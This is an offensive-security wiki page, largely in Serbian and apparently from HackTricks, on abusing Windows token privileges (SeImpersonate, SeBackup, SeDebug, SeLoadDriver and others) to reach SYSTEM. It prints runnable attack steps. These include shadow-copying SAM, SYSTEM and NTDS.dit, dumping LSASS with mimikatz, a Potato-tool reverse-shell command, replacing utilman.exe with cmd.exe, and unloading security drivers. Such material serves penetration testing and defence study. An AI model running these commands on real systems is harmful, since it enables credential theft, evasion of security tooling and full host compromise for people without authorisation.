# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Ako **ne znaš šta su Windows Access Tokens** pročitaj ovu stranicu pre nego što nastaviš:


{{#ref}}
access-tokens.md
{{#endref}}

**Možda možeš da eskaliraš privilegije zloupotrebom tokena koje već imaš**

### SeImpersonatePrivilege

Ovo je privilegija koju poseduje svaki proces i koja omogućava impersonation (ali ne i kreiranje) bilo kog tokena, pod uslovom da se može dobiti handle ka njemu. Privilegovani token može da se dobije od Windows servisa (DCOM) tako što se navede da izvrši NTLM autentifikaciju protiv exploita, nakon čega je moguće izvršenje procesa sa SYSTEM privilegijama. Ova ranjivost može da se iskoristi pomoću različitih alata, kao što su [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (koji zahteva da winrm bude onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato), i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Napomene za moderne operatore:

- **JuicyPotato je legacy**: na Windows 10 1809+/Server 2019+, prednost daj **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ili **PrintSpoofer** u zavisnosti od toga koja RPC/COM površina je još uvek dostupna.
- Ako si kompromitovao servis koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`** i `whoami /priv` prikazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, prvo povrati **default privilege set** tog naloga (na primer pomoću **FullPowers**) i zatim ponovo probaj potato family.
- Neki noviji forkovi su pogodniji za operatera od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/in-memory execution i modernu Windows kompatibilnost, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM servis i često je koristan kada je klasična Spooler putanja onemogućena.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Veoma je slično kao **SeImpersonatePrivilege**, koristiće **isti metod** da dobije privilegovani token.\
Zatim, ovo pravo omogućava da **dodeli primarni token** novom/suspendovanom procesu. Sa privilegovanim impersonation token-om možete derivirati primarni token (DuplicateTokenEx).\
Sa tokenom, možete napraviti **nov proces** pomoću 'CreateProcessAsUser' ili napraviti proces suspendovan i **podesiti token** (uopšteno, ne možete menjati primarni token procesa koji je već u radu).

### SeTcbPrivilege

Ako imate omogućen ovaj token možete koristiti **KERB_S4U_LOGON** da biste dobili **impersonation token** za bilo kog drugog korisnika bez znanja kredencijala, **dodati proizvoljnu grupu** (admins) u token, postaviti **integrity level** tokena na "**medium**", i dodeliti ovaj token **trenutnoj niti** (SetThreadToken).

### SeBackupPrivilege

Ova privilegija tera sistem da **odobri sav read access** bilo kom fajlu (ograničeno na operacije čitanja). Koristi se za **čitanje password hashes lokalnih Administrator** naloga iz registra, nakon čega se mogu koristiti alati poput "**psexec**" ili "**wmiexec**" sa hash-om (Pass-the-Hash tehnika). Međutim, ova tehnika ne uspeva u dva slučaja: kada je Local Administrator nalog onemogućen, ili kada postoji politika koja uklanja administrative rights od Local Administrators koji se povezuju udaljeno.\
U praksi, najpouzdaniji ugrađeni workflow je obično **VSS + `robocopy /b`**: napraviti/prikazati shadow copy, zatim kopirati `SAM`/`SYSTEM` ili `NTDS.dit` u **backup mode**, što zaobilazi file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Možete da **zloupotrebite ovaj privilegijum** pomoću:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- prateći **IppSec** u [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ili kao što je objašnjeno u odeljku **escalating privileges with Backup Operators** iz:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Dozvola za **write access** nad bilo kojim sistemskim fajlom, nezavisno od Access Control List (ACL) fajla, obezbeđena je ovim privilegijumom. Otvara brojne mogućnosti za eskalaciju, uključujući mogućnost da se **modifikuju servisi**, izvrši DLL Hijacking, i postave **debuggers** preko Image File Execution Options, među raznim drugim tehnikama.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik ima mogućnost da impersonira tokene, ali i u odsustvu SeImpersonatePrivilege. Ova mogućnost zavisi od sposobnosti da se impersonira token koji predstavlja istog korisnika i čiji integrity level ne prelazi integrity level trenutnog procesa.

**Ključne tačke:**

- **Impersonation bez SeImpersonatePrivilege:** Moguće je iskoristiti SeCreateTokenPrivilege za EoP impersoniranjem tokena pod određenim uslovima.
- **Uslovi za Token Impersonation:** Uspešna impersonation zahteva da ciljni token pripada istom korisniku i da ima integrity level koji je manji ili jednak integrity level-u procesa koji pokušava impersonation.
- **Kreiranje i modifikacija Impersonation tokena:** Korisnici mogu da kreiraju impersonation token i da ga unaprede dodavanjem SID-a (Security Identifier) privilegovane grupe.

### SeLoadDriverPrivilege

Ovaj privilegijum omogućava da se **load and unload device drivers** uz kreiranje registry unosa sa specifičnim vrednostima za `ImagePath` i `Type`. Pošto je direktan write access ka `HKLM` (HKEY_LOCAL_MACHINE) ograničen, umesto toga mora da se koristi `HKCU` (HKEY_CURRENT_USER). Međutim, da bi kernel prepoznao `HKCU` za konfiguraciju drivera, mora da se prati određena putanja.

Savremena ofanzivna upotreba je obično **BYOVD** (bring your own vulnerable driver): učitajte **potpisan ali ranjiv** kernel driver i zatim koristite njegove IOCTL-ove da onemogućite zaštite ili pređete na kernel code execution. Imajte na umu da na novijim Windows 11/Server buildovima **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često pokvare starije javne lance, pa klasični primeri tipa `szkg64.sys` više nisu univerzalno pouzdani.

Ova putanja je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU`, mora da se kreira cela ova putanja, i treba postaviti dve vrednosti:

- `ImagePath`, koji je putanja do binarnog fajla koji treba da se izvrši
- `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Koraci koje treba slediti:**

1. Pristupite `HKCU` umesto `HKLM` zbog ograničenog write access-a.
2. Kreirajte putanju `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
3. Postavite `ImagePath` na putanju za izvršavanje binarnog fajla.
4. Dodelite `Type` kao `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Još načina da se zloupotrebi ova privilegija u [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ovo je slično **SeRestorePrivilege**. Njena primarna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilazeći zahtev za eksplicitnim discretionary access kroz obezbeđivanje WRITE_OWNER prava pristupa. Proces podrazumeva da se najpre obezbedi vlasništvo nad željenim registry ključem radi upisa, a zatim da se izmeni DACL kako bi se omogućile operacije upisa.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ova privilegija omogućava **debugovanje drugih procesa**, uključujući čitanje i pisanje u memoriju. Razne strategije za memory injection, koje mogu zaobići većinu antivirusnih i host intrusion prevention rešenja, mogu se koristiti sa ovom privilegijom.

Na modernom Windows-u, imajte na umu da je `SeDebugPrivilege` obično dovoljan da otvori **nezaštićene SYSTEM procese** i duplira njihove tokene, ali to **ne garantuje** da možete da pristupite **LSASS**. Ako je **RunAsPPL / LSA Protection** omogućen, nezaštićeni procesi ne mogu da čitaju ili vrše injection u LSASS čak i ako je `SeDebugPrivilege` prisutan. U tom slučaju, ukradite token iz drugog non-PPL SYSTEM procesa, ili kombinujte sa PPL bypass/BYOVD umesto da pretpostavljate da će `procdump` raditi. Za kompletan primer kopiranja tokena koristeći `SeDebugPrivilege` + `SeImpersonatePrivilege`, pogledajte [ovu stranicu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Možete koristiti [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) da **snimite memoriju procesa**. Konkretno, ovo se može primeniti na proces **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je odgovoran za čuvanje korisničkih kredencijala nakon što se korisnik uspešno prijavi u sistem.

Zatim možete učitati ovaj dump u mimikatz da biste dobili lozinke:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ako želiš da dobiješ `NT SYSTEM` shell, možeš da koristiš:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Ovo pravo (Perform volume maintenance tasks) omogućava otvaranje raw volume device handle-ova (npr., \\.\C:) za direktan disk I/O koji zaobilazi NTFS ACLs. Sa njim možete kopirati bajtove bilo kog fajla na volume-u čitajući osnovne blokove, što omogućava arbitrary file read osetljivih materijala (npr. machine private keys u %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS preko VSS). Posebno je uticajno na CA serverima gde exfiltrating CA private key omogućava forging Golden Certificate da biste impersonate-ovali bilo koji principal.

Pogledajte detaljne tehnike i mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Tokeni koji se pojavljuju kao Disabled** obično mogu da se omoguće, tako da često možete zloupotrebiti i _Enabled_ i _Disabled_ privilegije.

### Omogući sve tokene

Ako imate onemogućene privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokene:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Sensitive fajlove čitaj sa `robocopy /b` ili namenskim SeBackup-aware copy helper alatima.                                                                                                                                                                                                                                                                 | <p>- Odlično za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a ponekad i `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je zgodan, ali namenski SeBackup cmdlets/APIs su često fleksibilniji za zaključane/otvorene fajlove.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Napravi proizvoljan token, uključujući local admin prava, pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliraj **non-PPL** SYSTEM token ili dumpuj memoriju iz procesa koji nije zaštićen.                                                                                                                                                                                                                                                                 | <p>LSASS dumping je često blokiran ako je RunAsPPL/LSA Protection omogućen.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Koristi **Potato family** / named-pipe impersonation da pokreneš SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Najpraktičnije iz service accounts kao što su IIS APPPOOL, MSSQL, scheduled tasks, ili bilo kog konteksta koji već poseduje `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Učitaj signed-but-vulnerable kernel driver (BYOVD)<br>2. Iskoristi driver's IOCTLs da dobiješ kernel R/W, isključiš security tooling, ili eskaliraš do SYSTEM<br><br>Alternativno, privilege može da se koristi za unload security-related drivers pomoću <code>fltMC</code> builtin command, tj. <code>fltMC sysmondrv</code></p>                     | <p>Stariji public driver-i kao što je <code>szkg64.sys</code> sve češće su blokirani na modernom Windows-u pomoću vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokreni PowerShell/ISE sa prisutnim SeRestore privilege.<br>2. Omogući privilege pomoću <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenuj utilman.exe u utilman.old<br>4. Preimenuj cmd.exe u utilman.exe<br>5. Zaključaj konzolu i pritisni Win+U</p> | <p>Napad može biti detektovan od strane nekog AV software-a.</p><p>Alternativna metoda se oslanja na zamenu service binaries smeštenih u "Program Files" koristeći isti privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenuj cmd.exe u utilman.exe<br>4. Zaključaj konzolu i pritisni Win+U</p>                                                                                                                                       | <p>Napad može biti detektovan od strane nekog AV software-a.</p><p>Alternativna metoda se oslanja na zamenu service binaries smeštenih u "Program Files" koristeći isti privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuliši tokenima tako da local admin prava budu uključena. Može zahtevati SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
